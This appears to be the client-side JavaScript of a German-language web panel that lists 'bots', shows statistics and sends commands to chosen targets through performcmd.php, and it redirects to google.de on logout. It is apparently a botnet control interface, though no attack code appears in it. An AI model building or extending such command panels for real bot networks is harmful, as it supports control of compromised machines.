// Hilfsfunktionen
function radioWert(rObj) {
  for (var i=0; i<rObj.length; i++) if (rObj[i].checked) return rObj[i].value;
  return false;
}

// JavaScript Funktionen für den Desktop
var winW = null;
function showArbeitsplatz() {
	winW = new Window('W', {className: "alphacube", title: "Arbeitsplatz", width:600, height:150, top:270, left:400});
	winW.setAjaxContent("workplace.php", { method: 'get' }, false, false);
	winW.setDestroyOnClose();
	winW.show();
}

var winB = null;
function showBots() {
	winB = new Window('B', {className: "alphacube", title: "Bots anzeigen", width:770, height:500, top:100, left:100});
	winB.setAjaxContent("showbots.php", { method: 'get' }, false, false);
	winB.setDestroyOnClose();
	winB.show();
}
function refreshBots(pVon, pMenge) {
	var mParam = 'von='+pVon+'&menge='+pMenge;
	winB.setAjaxContent("showbots.php", { method: 'post', parameters: mParam }, false, false);
}
function refreshBotsO(pVon, pMenge) {
	var mParam = 'von='+pVon+'&menge='+pMenge+"&on=sure";
	winB.setAjaxContent("showbots.php", { method: 'post', parameters: mParam }, false, false);
}

var winW = null;
function showExec() {
	winE = new Window('E', {className: "alphacube", title: "Befehle", width:650, height:400, top:170, left:300});
	winE.setAjaxContent("performcmd.php", { method: 'get' }, false, false);
	winE.setDestroyOnClose();
	winE.show();
}
function applyCmd(pCmd) {
	var mParam = 'cmd='+pCmd;
	winE.setAjaxContent("performcmd.php", { method: 'post', parameters: mParam }, false, false);
}

function execStep1(pTarget) {
	var mParam = 'target='+pTarget;
	winE.setAjaxContent("performcmd.php", { method: 'post', parameters: mParam }, false, false);
}
function execStep2(pCmd) {
	var mParam = 'cmd='+pCmd;
	winE.setAjaxContent("performcmd.php", { method: 'post', parameters: mParam }, false, false);
}

var winS = null;
function showStat() {
	var wLeft = window.innerWidth - 300;
	winS = new Window('S', {className: "alphacube", title: "Statistik", width:280, height:100, top:5, left:wLeft});
	winS.setAjaxContent("stat.php", { method: 'get' }, false, false);
	winS.setDestroyOnClose();
	winS.show();
}

var timeout; 
function showLogout() {
	Dialog.info("Logout<br>Reload in 3s", {width:200, height:80, showProgress: true, className: "alphacube"});
	timeout=3;
	setTimeout(infoTimeout, 1000);
}
function infoTimeout() {
	timeout--;
	if (timeout >0) { 
		//Windows.CloseAll();
		Dialog.setInfoMessage("Logout<br>Reload in " + timeout + "s");
		setTimeout(infoTimeout, 1000);
	} else {
		location.href="http://google.de";
		Dialog.closeInfo()
	}
} 